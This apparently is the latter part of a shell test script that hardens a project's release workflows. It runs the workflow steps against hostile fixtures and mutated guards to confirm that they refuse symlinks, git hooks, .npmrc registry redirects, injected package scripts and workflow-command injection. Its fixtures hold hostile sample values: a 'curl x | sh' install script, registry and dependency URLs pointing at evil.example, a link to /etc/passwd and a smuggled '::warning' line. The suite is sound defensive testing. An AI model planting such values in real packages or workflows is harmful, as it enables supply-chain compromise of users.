	copy_case 'a 7 MiB header is accepted (#1049)' ok 'head -c 7340032 /dev/zero >webview_go/libs/big.h'
	# copy_mutant <label> <exact text> <replacement> <copy_case arguments...>
	copy_mutant() {
		local label="$1" old="$2" new="$3"
		shift 3
		local mutated
		mutated="$(OLD="$old" NEW="$new" SRC="$COPY_STEP" bun -e 'const s = process.env.SRC; if (!s.includes(process.env.OLD)) process.exit(2); process.stdout.write(s.replace(process.env.OLD, () => process.env.NEW));')" || {
			no "webview copy mutant '${label}' could be applied (the step no longer has the text it mutates)"
			return
		}
		local res; res="$(COPY_STEP_UNDER_TEST="$mutated" copy_case "$@")"; if grep -q "^  FAIL" <<<"$res"; then ok "reports: ${label}"; else no "reports: ${label}" "the case passed a step with this hole"; fi
	}
	# shellcheck disable=SC2016 # literal workflow text, not shell.
	{
		copy_mutant 'the webview copy taking links (#983)' \
			'-not -type f -not -type d -print -quit' '-false -print -quit' \
			'a link inside the vendored tree is refused' refused 'ln -s /etc/passwd webview_go/libs/evil.h'
		copy_mutant 'the webview copy taking a .git (#983)' \
			'-iname .git -print -quit' '-iname .nothing -print -quit' \
			'a nested .git directory is refused' refused 'mkdir -p webview_go/libs/.git/hooks && printf x >webview_go/libs/.git/hooks/pre-commit' 'holds a .git'
		copy_mutant 'the webview copy taking any shape of artifact (#983)' \
			'if [ "$(find "$in" -mindepth 1 -maxdepth 1 | wc -l)" != 3 ] || [ ! -f "$in/go.mod" ] || [ ! -f "$in/go.sum" ] || [ ! -d "$in/webview_go" ]; then' 'if false; then' \
			'an extra file beside the tree is refused' refused 'printf x >evil.sh'
		copy_mutant 'the webview copy matching .git in one case only (review of #983)' \
			'-iname .git -print -quit' '-name .git -print -quit' \
			'a .GIT directory, which a case-insensitive git reads as .git, is refused' refused 'mkdir -p webview_go/libs/.GIT/hooks && printf x >webview_go/libs/.GIT/hooks/post-checkout' 'holds a .git'
		copy_mutant 'the webview copy taking any name (review of #983)' \
			"-name '*[!A-Za-z0-9._+-]*' -print -quit" '-false -print -quit' \
			'a name with a space in it is refused' refused 'printf x >"webview_go/a b.go"'
		copy_mutant 'the webview copy with no size cap (#1049)' \
			'[ "$bytes" -gt 8388608 ]' '[ "$bytes" -gt 999999999999 ]' \
			'more than 8 MiB is refused (#1049)' refused 'head -c 8388609 /dev/zero >webview_go/libs/big.h'
		copy_mutant 'the webview copy with no file count cap (#1049)' \
			'[ "$files" -gt 100 ]' '[ "$files" -gt 100000 ]' \
			'more than 100 files is refused (#1049)' refused 'for i in $(seq 1 100); do printf x >"webview_go/libs/f$i.h"; done'
		copy_mutant 'the webview copy taking any top-level file (#1049)' \
			'*) echo "::error::the vendored tree holds ${name}, which vendor-webview.sh does not copy (#1049)"; exit 1 ;;' '*) ;;' \
			'a build script at the top of the vendored tree is refused (#1049)' refused 'printf "#!/bin/sh\n" >webview_go/build.sh'
		copy_mutant 'the webview copy taking a top-level test file (#1049)' \
			'"f "*_test.go) echo' '"f "*_nothing.go) echo' \
			'a test file at the top of the vendored tree is refused (#1049)' refused 'printf "package webview\n" >webview_go/webview_test.go'
		copy_mutant 'the webview copy not comparing sidecar/go.mod (#1049)' \
			'new_mod="$(directives "$in/go.mod")"' 'new_mod="$main_mod"' \
			'a new replace in sidecar/go.mod is refused (#1049)' refused 'printf "replace golang.org/x/sys => ../evil\n" >>go.mod'
		copy_mutant 'the webview copy blind to block entries (#1049)' \
			'block != "" { print block " " $0; next }' 'block != "" { next }' \
			'a require moved to another version inside the block is refused (#1049)' refused 'sed -i "s|golang.org/x/sys v[0-9.]*|golang.org/x/sys v0.1.0|" go.mod && grep -q "x/sys v0.1.0" go.mod'
		copy_mutant 'the webview copy reading a block entry without its keyword (#1049)' \
			'block != "" { print block " " $0; next }' 'block != "" { print; next }' \
			'a require block turned into an exclude block is refused (#1049)' refused 'sed -i "s/^require (/exclude (/" go.mod && grep -q "^exclude (" go.mod'
		copy_mutant 'the webview copy not comparing the vendored go.mod (#1049)' \
			'new_mod="$(directives "$in/webview_go/go.mod" | awk' 'new_mod="$(directives sidecar/third_party/webview_go/go.mod | awk' \
			'a replace in the vendored go.mod is refused (#1049)' refused 'printf "replace golang.org/x/sys => ../evil\n" >>webview_go/go.mod'
		copy_mutant 'LICENSE matched as a prefix again (#1049 review)' \
			'| "f LICENSE") ;;' '| "f LICENSE"*) ;;' \
			'a LICENSE.syso, which Go links by its extension, is refused (#1049 review)' refused 'printf x >webview_go/LICENSE.syso'
		copy_mutant 'libs taking any file (#1049 review)' \
			'libs/*.h | libs/*.go | libs/*.txt | libs/*/LICENSE) ;;' 'libs/*) ;;' \
			'a .syso under libs is refused (#1049 review)' refused 'printf x >webview_go/libs/webview/evil_windows_amd64.syso'
		copy_mutant 'the kept files taken as the artifact has them (#1049 review)' \
			'for f in .gitattributes jarvis.patch JARVIS_PATCH.md; do' 'for f in; do' \
			'a changed .gitattributes is refused (#1049 review)' refused 'printf "*.go -diff linguist-generated=true\n" >>webview_go/.gitattributes'
		copy_mutant 'a .git name below the top let through (#1049 review)' \
			"-mindepth 2 -iname '.git*' -print -quit" '-false -print -quit' \
			'a header inside a .git-named directory under libs is refused (#1049 review)' refused 'mkdir -p webview_go/libs/.gitmodules.d && printf x >webview_go/libs/.gitmodules.d/a.h'
		copy_mutant 'go.sum taken as the artifact has it (#1049 review)' \
			'if ! cmp -s "$in/go.sum" sidecar/go.sum; then' 'if false; then' \
			'a line added to go.sum is refused (#1049 review)' refused 'printf "evil.example/x v1.0.0 h1:AAAA=\n" >>go.sum'
		copy_mutant 'no directory cap (#1049 review)' \
			'[ "$dirs" -gt 50 ]' '[ "$dirs" -gt 50000 ]' \
			'more than 50 directories is refused (#1049 review)' refused 'for i in $(seq 1 50); do mkdir "webview_go/libs/d$i"; done'
		copy_mutant 'the go.mod difference printed raw (#1049 review)' \
			'| cat -v || true' '|| true' \
			'a workflow command after a carriage return is printed inert (#1049 review)' refused 'printf "toolchain go1.25.0\r::warning title=ok::bump checks passed\n" >>go.mod' 'toolchain go1.25.0^M::warning'
		copy_mutant 'go.mod comments kept, so a tidy comment reads as a change (#1049 review)' \
			'{ sub(/\/\/.*/, "") }' '{ }' \
			'the vendored tree replaces the old one, its hidden file kept and a dropped file dropped' ok ':'
		copy_mutant 'go.mod spacing kept, so reformatting reads as a change (#1049 review)' \
			'{ $1 = $1 }' '{ }' \
			'the vendored tree replaces the old one, its hidden file kept and a dropped file dropped' ok ':'
		copy_mutant 'the webview copy taking a tree of another version (review of #983)' \
			'!= "$VERSION" ]; then' '= x ]; then' \
			'a tree recording another version is refused' refused 'printf "v9.9.9\n" >webview_go/UPSTREAM_VERSION'
	}
fi

echo
echo "publish-sidecar refuses npm config and package fields that change what npm runs (#1046)"
# npm reads a .npmrc in the directory it runs from, and acts on package.json
# fields such as scripts and publishConfig; the job holding id-token checks
# its checkout for both before any npm command. The step, executed verbatim
# against a copy of sidecar/npm, then against hostile copies of it.
NPMRC_STEP_NAME="Refuse npm config and package fields that change what npm runs"
NPMRC_STEP="$(FILE="$WORKFLOWS/sidecar-release.yml" NAME="$NPMRC_STEP_NAME" bun -e '
const d = Bun.YAML.parse(await Bun.file(process.env.FILE).text());
const st = (d.jobs?.["publish-sidecar"]?.steps ?? []).find((s) => s.name === process.env.NAME);
if (!st || typeof st.run !== "string") process.exit(2);
process.stdout.write(st.run);
')" || NPMRC_STEP=""
# npmrc_case <label> <ok|refused> <shell run in the fixture checkout to shape it>
npmrc_case() {
	local d="${WORK}/npmrc" rc=0 ok_=0
	rm -rf "$d" && mkdir -p "$d/ws/sidecar" && cp -R "${HERE}/../../sidecar/npm" "$d/ws/sidecar/npm" || {
		no "npm content: $1 (the fixture could not be made)"
		return
	}
	(cd "$d/ws" && eval "$3") || {
		no "npm content: $1 (the fixture could not be shaped)"
		return
	}
	(cd "$d/ws" && env -i PATH="$PATH" bash -e -c "${NPMRC_STEP_UNDER_TEST:-$NPMRC_STEP}") >"$d/log" 2>&1 || rc=$?
	case "$2" in
	ok) [ "$rc" -eq 0 ] && ok_=1 ;;
	refused) [ "$rc" -ne 0 ] && grep -q '^::error::.*(#1046)' "$d/log" && ok_=1 ;;
	esac
	if [ "$ok_" = 1 ]; then ok "npm content: $1"; else no "npm content: $1" "exit ${rc}; log: $(cat "$d/log")"; fi
}
# npmrc_field <package dir> <jq filter>: rewrite one fixture package.json.
npmrc_field() { jq "$2" "sidecar/npm/$1/package.json" >pj.tmp && mv pj.tmp "sidecar/npm/$1/package.json"; }
if [ -z "$NPMRC_STEP" ]; then
	no "found sidecar-release.yml publish-sidecar: ${NPMRC_STEP_NAME}"
else
	npmrc_case 'the six packages as committed pass' ok ':'
	npmrc_case 'a prepublishOnly script in a platform package is refused' refused 'npmrc_field linux-x64 ".scripts = {prepublishOnly: \"curl x | sh\"}"'
	npmrc_case 'a version script in the wrapper package is refused' refused 'npmrc_field jarvis-sidecar ".scripts = {version: \"id\"}"'
	npmrc_case 'an empty scripts object is refused' refused 'npmrc_field win32-x64 ".scripts = {}"'
	npmrc_case 'a publishConfig that redirects the publish is refused' refused 'npmrc_field darwin-arm64 ".publishConfig = {registry: \"https://evil.example/\"}"'
	npmrc_case 'a package.json that is not an object is refused' refused 'printf "[]\n" >sidecar/npm/darwin-x64/package.json'
	npmrc_case 'a package.json that is not JSON is refused' refused 'printf "{\n" >sidecar/npm/linux-arm64/package.json'
	npmrc_case 'a missing package.json is refused' refused 'rm sidecar/npm/linux-arm64/package.json'
	npmrc_case 'a .npmrc beside a package is refused' refused 'printf "registry=https://evil.example/\n" >sidecar/npm/linux-x64/.npmrc'
	npmrc_case 'a .npmrc at the root of the checkout is refused' refused 'printf "registry=https://evil.example/\n" >.npmrc'
	npmrc_case 'a .npmrc anywhere in the checkout is refused' refused 'mkdir -p ui/x && printf "x=1\n" >ui/x/.npmrc'
	npmrc_case 'a .npmrc that is a directory is refused' refused 'mkdir sidecar/npm/win32-x64/.npmrc'
	# Security review of #1046: links, extra files, and the values.
	npmrc_case 'a bin link to its own package, which an artifact would unpack a .npmrc through, is refused' refused 'ln -s . sidecar/npm/darwin-arm64/bin'
	npmrc_case 'a package.json that is a link to a benign file is refused' refused 'mkdir sidecar/npm/linux-x64/bin && mv sidecar/npm/linux-x64/package.json sidecar/npm/linux-x64/bin/p.json && ln -s bin/p.json sidecar/npm/linux-x64/package.json'
	npmrc_case 'sidecar/npm as a link is refused' refused 'mv sidecar/npm sidecar/real && ln -s real sidecar/npm'
	npmrc_case 'an extra file in a package is refused' refused 'printf x >sidecar/npm/win32-x64/README.md'
	npmrc_case 'a package.json above the packages is refused' refused 'printf "{\"workspaces\": [\"*\"]}\n" >sidecar/npm/package.json'
	npmrc_case 'a platform package renamed to the wrapper is refused' refused 'npmrc_field linux-x64 ".name = \"@usejarvis/sidecar\""'
	npmrc_case 'a platform package renamed to the brain is refused' refused 'npmrc_field darwin-x64 ".name = \"@usejarvis/brain\""'
	npmrc_case 'the wrapper renamed is refused' refused 'npmrc_field jarvis-sidecar ".name = \"@usejarvis/brain\""'
	npmrc_case 'a platform package shipping more than bin is refused' refused 'npmrc_field linux-arm64 ".files = [\"bin\", \"lib\"]"'
	npmrc_case 'a platform package with a bin field is refused' refused 'npmrc_field win32-x64 ".bin = {\"x\": \"bin/x\"}"'
	npmrc_case 'the wrapper launching another file is refused' refused 'npmrc_field jarvis-sidecar ".bin = {\"jarvis\": \"bin/other\"}"'
	npmrc_case 'the wrapper depending on another package is refused' refused 'npmrc_field jarvis-sidecar ".optionalDependencies[\"evil\"] = \"1.0.0\""'
	npmrc_case 'the wrapper depending on a platform package by URL is refused' refused 'npmrc_field jarvis-sidecar ".optionalDependencies[\"@usejarvis/sidecar-linux-x64\"] = \"https://evil.example/x.tgz\""'
	# npmrc_mutant <label> <exact text> <replacement> <npmrc_case arguments...>
	npmrc_mutant() {
		local label="$1" old="$2" new="$3" mutated res
		shift 3
		mutated="$(OLD="$old" NEW="$new" SRC="$NPMRC_STEP" bun -e 'const s = process.env.SRC; if (!s.includes(process.env.OLD)) process.exit(2); process.stdout.write(s.replace(process.env.OLD, () => process.env.NEW));')" || {
			no "npm content mutant '${label}' could be applied (the step no longer has the text it mutates)"
			return
		}
		res="$(NPMRC_STEP_UNDER_TEST="$mutated" npmrc_case "$@")"
		if grep -q "^  FAIL" <<<"$res"; then ok "reports: ${label}"; else no "reports: ${label}" "the case passed a step with this hole"; fi
	}
	# shellcheck disable=SC2016 # literal workflow text, not shell.
	{
		npmrc_mutant 'the .npmrc search dropped (#1046)' \
			'find . -name .npmrc -print -quit' 'true' \
			'a .npmrc anywhere in the checkout is refused' refused 'mkdir -p ui/x && printf "x=1\n" >ui/x/.npmrc'
		npmrc_mutant 'the .npmrc search held to sidecar/npm, missing one at the root (#1046)' \
			'find . -name .npmrc -print -quit' 'find sidecar/npm -name .npmrc -print -quit' \
			'a .npmrc at the root of the checkout is refused' refused 'printf "registry=https://evil.example/\n" >.npmrc'
		npmrc_mutant 'scripts allowed back into the package fields (#1046)' \
			'"repository", "version"]' '"repository", "scripts", "version"]' \
			'a prepublishOnly script in a platform package is refused' refused 'npmrc_field linux-x64 ".scripts = {prepublishOnly: \"curl x | sh\"}"'
		npmrc_mutant 'the wrapper package left out of the field check (#1046)' \
			'.name == "@usejarvis/sidecar" and' 'true or' \
			'a version script in the wrapper package is refused' refused 'npmrc_field jarvis-sidecar ".scripts = {version: \"id\"}"'
		npmrc_mutant 'the tree check dropped, links let through (#1046 review)' \
			'if [ "$tree" != ' 'if false && [ "$tree" != ' \
			'a bin link to its own package, which an artifact would unpack a .npmrc through, is refused' refused 'ln -s . sidecar/npm/darwin-arm64/bin'
		npmrc_mutant 'the platform name left unchecked (#1046 review)' \
			'.name == $name and' '' \
			'a platform package renamed to the brain is refused' refused 'npmrc_field darwin-x64 ".name = \"@usejarvis/brain\""'
		npmrc_mutant 'the wrapper dependency values left unchecked (#1046 review)' \
			'all(.[]; type == "string" and test(' 'all(.[]; type == "string" or test(' \
			'the wrapper depending on a platform package by URL is refused' refused 'npmrc_field jarvis-sidecar ".optionalDependencies[\"@usejarvis/sidecar-linux-x64\"] = \"https://evil.example/x.tgz\""'
		npmrc_mutant 'the wrapper dependencies left unchecked (#1046 review)' \
			'(.optionalDependencies | type == "object" and keys == [' '(true or keys == [' \
			'the wrapper depending on another package is refused' refused 'npmrc_field jarvis-sidecar ".optionalDependencies[\"evil\"] = \"1.0.0\""'
	}
fi
# The step fails the release on a .npmrc anywhere in the checkout; this
# fails the PR that adds one first. node_modules, .git and .claude are not
# in a checkout.
# npmrc_tree <dir>: every .npmrc under it, one per line.
npmrc_tree() {
	# shellcheck disable=SC2016 # JavaScript source, not shell.
	DIR="$1" bun -e '
const fs = require("node:fs");
const skip = new Set(["node_modules", ".git", ".claude"]);
const walk = (d, rel) => {
  for (const e of fs.readdirSync(d, { withFileTypes: true })) {
    if (e.name === ".npmrc") console.log(rel + e.name);
    if (e.isDirectory() && !skip.has(e.name)) walk(d + "/" + e.name, rel + e.name + "/");
  }
};
walk(process.env.DIR, "");
'
}
found="$(npmrc_tree "${HERE}/../..")" || found="the bun helper failed"
if [ -z "$found" ]; then ok "no .npmrc in the repository, which publish-sidecar would refuse (#1046)"; else no "no .npmrc in the repository, which publish-sidecar would refuse (#1046)" "$found"; fi
rm -rf "${WORK}/npmrctree" && mkdir -p "${WORK}/npmrctree/a/b" && printf 'x=1\n' >"${WORK}/npmrctree/a/b/.npmrc"
if [ "$(npmrc_tree "${WORK}/npmrctree")" = "a/b/.npmrc" ]; then ok "reports: a .npmrc deep in the tree (#1046)"; else no "reports: a .npmrc deep in the tree (#1046)"; fi
# ...and again where npm runs (security review of #1046): Prepare platform
# packages, executed verbatim with an npm that only logs, against artifacts
# shaped as a build job could shape them and a checkout whose bin/ is a link.
PREP_STEP="$(FILE="$WORKFLOWS/sidecar-release.yml" bun -e '
const d = Bun.YAML.parse(await Bun.file(process.env.FILE).text());
const st = (d.jobs?.["publish-sidecar"]?.steps ?? []).find((s) => s.name === "Prepare platform packages");
if (!st || typeof st.run !== "string") process.exit(2);
process.stdout.write(st.run);
')" || PREP_STEP=""
# prep_case <label> <ok|refused> <shell run in the workspace to shape it>
prep_case() {
	local d="${WORK}/prep" rc=0 ok_=0 p
	rm -rf "$d" && mkdir -p "$d/ws/sidecar" "$d/bin" "$d/app/Jarvis.app/Contents/MacOS" && cp -R "${HERE}/../../sidecar/npm" "$d/ws/sidecar/npm" || {
		no "npm content at Prepare: $1 (the fixture could not be made)"
		return
	}
	printf '#!/usr/bin/env bash\nprintf "%%s %%s\\n" "$(basename "$PWD")" "$*" >>"%s/npm.log"\n' "$d" >"$d/bin/npm" && chmod +x "$d/bin/npm"
	printf 'app\n' >"$d/app/Jarvis.app/Contents/MacOS/jarvis"
	for p in linux-x64 linux-arm64; do mkdir -p "$d/ws/artifacts/sidecar-$p" && printf 'elf\n' >"$d/ws/artifacts/sidecar-$p/jarvis"; done
	mkdir -p "$d/ws/artifacts/sidecar-win32-x64" && printf 'pe\n' >"$d/ws/artifacts/sidecar-win32-x64/jarvis.exe"
	for p in darwin-arm64 darwin-x64; do mkdir -p "$d/ws/artifacts/sidecar-$p" && tar -czf "$d/ws/artifacts/sidecar-$p/jarvis-app.tar.gz" -C "$d/app" Jarvis.app; done
	(cd "$d/ws" && D="$d" eval "$3") || {
		no "npm content at Prepare: $1 (the fixture could not be shaped)"
		return
	}
	: >"$d/npm.log"
	(cd "$d/ws" && env -i PATH="$d/bin:$PATH" GITHUB_WORKSPACE="$d/ws" VERSION=1.2.3 bash -e -c "${PREP_STEP_UNDER_TEST:-$PREP_STEP}") >"$d/log" 2>&1 || rc=$?
	case "$2" in
	ok) [ "$rc" -eq 0 ] && [ "$(grep -c ' version 1.2.3 ' "$d/npm.log")" = 6 ] && ok_=1 ;;
	refused) [ "$rc" -ne 0 ] && grep -q '^::error::.*(#1046)' "$d/log" && ! grep -q '^darwin-arm64 ' "$d/npm.log" && ok_=1 ;;
	refused-wrapper) [ "$rc" -ne 0 ] && grep -q '^::error::the wrapper does not depend on all five' "$d/log" && ok_=1 ;;
	esac
	if [ "$ok_" = 1 ]; then ok "npm content at Prepare: $1"; else no "npm content at Prepare: $1" "exit ${rc}; log: $(cat "$d/log"); npm: $(cat "$d/npm.log")"; fi
}
# The app tarball with a .npmrc at its top, beside Jarvis.app.
PREP_EVIL='printf "registry=https://evil.example/\n" >"$D/app/.npmrc" && for p in darwin-arm64; do tar -czf "artifacts/sidecar-$p/jarvis-app.tar.gz" -C "$D/app" Jarvis.app .npmrc; done'
if [ -z "$PREP_STEP" ]; then
	no "found sidecar-release.yml publish-sidecar: Prepare platform packages"
else
	prep_case 'the six packages version with their artifacts in' ok ':'
	prep_case 'an app tarball unpacked into bin/ with a .npmrc in it is fine' ok "$PREP_EVIL"
	prep_case 'a bin link to its package, through which the tarball lands a .npmrc beside npm, is refused' refused "ln -s . sidecar/npm/darwin-arm64/bin && $PREP_EVIL"
	# The wrapper rewrite read back (round 2 review of #1046): sed edits
	# lines. npm 12.1.0 puts a value back on its key line first (measured),
	# and the npm here only logs, so this stands for an npm that does not.
	PREP_SPLIT='sed -i "s|\"@usejarvis/sidecar-linux-x64\": \"0.1.0\"|\"@usejarvis/sidecar-linux-x64\":\n      \"0.1.0\"|" sidecar/npm/jarvis-sidecar/package.json && jq -e . sidecar/npm/jarvis-sidecar/package.json >/dev/null && grep -qx "      \"0.1.0\"," sidecar/npm/jarvis-sidecar/package.json'
	prep_case 'a wrapper dependency the line-based rewrite misses is refused' refused-wrapper "$PREP_SPLIT"
	# The field check again where npm runs (review of the branch): a
	# package.json that differs from what the checkout check passed, here
	# one carrying a script, stops Prepare before its npm version.
	PREP_SCRIPT='jq ".scripts = {version: \"id\"}" sidecar/npm/darwin-arm64/package.json >pj.tmp && mv pj.tmp sidecar/npm/darwin-arm64/package.json'
	prep_case 'a platform package.json that changed after the checkout check is refused before npm runs there' refused "$PREP_SCRIPT"
	mutated="$(SRC="$PREP_STEP" bun -e 'const s = process.env.SRC; const o = "if [ \"$(find \"${pkg_dir}\" -mindepth 1 -maxdepth 1"; if (!s.includes(o)) process.exit(2); process.stdout.write(s.replace(o, () => "if false && [ \"$(find \"${pkg_dir}\" -mindepth 1 -maxdepth 1"));')" || mutated=""
	if [ -z "$mutated" ]; then
		no "Prepare mutant could be applied (the step no longer has the text it mutates)"
	elif grep -q "^  FAIL" <<<"$(PREP_STEP_UNDER_TEST="$mutated" prep_case 'x' refused "ln -s . sidecar/npm/darwin-arm64/bin && $PREP_EVIL")"; then
		ok "reports: Prepare no longer checking the package directory before npm (#1046 review)"
	else
		no "reports: Prepare no longer checking the package directory before npm (#1046 review)" "the case passed a step with this hole"
	fi
	mutated="$(SRC="$PREP_STEP" bun -e 'const s = process.env.SRC; const o = "if ! jq -e --arg name"; if (!s.includes(o)) process.exit(2); process.stdout.write(s.replace(o, () => "if false && jq -e --arg name"));')" || mutated=""
	if [ -z "$mutated" ]; then
		no "Prepare field re-check mutant could be applied (the step no longer has the text it mutates)"
	elif grep -q "^  FAIL" <<<"$(PREP_STEP_UNDER_TEST="$mutated" prep_case 'x' refused "$PREP_SCRIPT")"; then
		ok "reports: Prepare no longer checking package.json fields before npm (review of #1046)"
	else
		no "reports: Prepare no longer checking package.json fields before npm (review of #1046)" "the case passed a step with this hole"
	fi
	mutated="$(SRC="$PREP_STEP" bun -e 'const s = process.env.SRC; const o = "if ! jq -e --arg v"; if (!s.includes(o)) process.exit(2); process.stdout.write(s.replace(o, () => "if false && jq -e --arg v"));')" || mutated=""
	if [ -z "$mutated" ]; then
		no "Prepare read-back mutant could be applied (the step no longer has the text it mutates)"
	elif grep -q "^  FAIL" <<<"$(PREP_STEP_UNDER_TEST="$mutated" prep_case 'x' refused-wrapper "$PREP_SPLIT")"; then
		ok "reports: the wrapper rewrite no longer read back (#1046 review)"
	else
		no "reports: the wrapper rewrite no longer read back (#1046 review)" "the case passed a step with this hole"
	fi
fi
# ...and before the first step that runs npm, or sets it up.
npmrc_order() {
	# shellcheck disable=SC2016 # JavaScript source, not shell.
	FILE="$1" NAME="$NPMRC_STEP_NAME" bun -e '
const d = Bun.YAML.parse(await Bun.file(process.env.FILE).text());
const steps = d.jobs?.["publish-sidecar"]?.steps ?? [];
const at = steps.findIndex((s) => s.name === process.env.NAME);
const first = steps.findIndex((s) => /\bnpm\b/.test(String(s.run ?? "")) || String(s.uses ?? "").toLowerCase().startsWith("actions/setup-node@"));
if (at < 0) console.log("publish-sidecar has no step " + process.env.NAME);
else if (first >= 0 && first < at) console.log("publish-sidecar sets up or runs npm in step " + first + " (" + (steps[first].name ?? steps[first].uses) + "), before " + process.env.NAME);
'
}
found="$(npmrc_order "$WORKFLOWS/sidecar-release.yml")" || found="the bun helper failed"
if [ -z "$found" ]; then ok "sidecar-release.yml: publish-sidecar checks npm config and package fields before it sets up or runs npm (#1046)"; else no "sidecar-release.yml: publish-sidecar checks npm config and package fields before it sets up or runs npm (#1046)" "$found"; fi
copy="${WORK}/npmrc-order.yml"
# shellcheck disable=SC2016 # literal workflow text, not shell.
if FROM="$WORKFLOWS/sidecar-release.yml" TO="$copy" NAME="$NPMRC_STEP_NAME" bun -e '
const s = await Bun.file(process.env.FROM).text();
const m = new RegExp("      - name: " + process.env.NAME + "\\n        run: \\|\\n(?:          .*\\n|\\n)*?\\n").exec(s);
const anchor = "      - name: Ensure npm supports Trusted Publishing\n";
if (!m || !s.includes(anchor)) process.exit(2);
const t = s.replace(m[0], "");
await Bun.write(process.env.TO, t.replace(anchor, () => m[0] + anchor));
' && grep -qF 'sets up or runs npm in step' <<<"$(npmrc_order "$copy")"; then
	ok "reports: the npm content check moved after setup-node (#1046)"
else
	no "reports: the npm content check moved after setup-node (#1046)"
fi
if FROM="$WORKFLOWS/sidecar-release.yml" TO="$copy" bun -e '
const s = await Bun.file(process.env.FROM).text();
const old = "      - name: Refuse npm config and package fields that change what npm runs\n";
if (!s.includes(old)) process.exit(2);
await Bun.write(process.env.TO, s.replace(old, () => "      - name: Something else\n"));
' && grep -qF 'has no step' <<<"$(npmrc_order "$copy")"; then
	ok "reports: the npm content check gone from publish-sidecar (#1046)"
else
	no "reports: the npm content check gone from publish-sidecar (#1046)"
fi

echo
echo "${pass} passed, ${fail} failed"
[ "$fail" -eq 0 ]
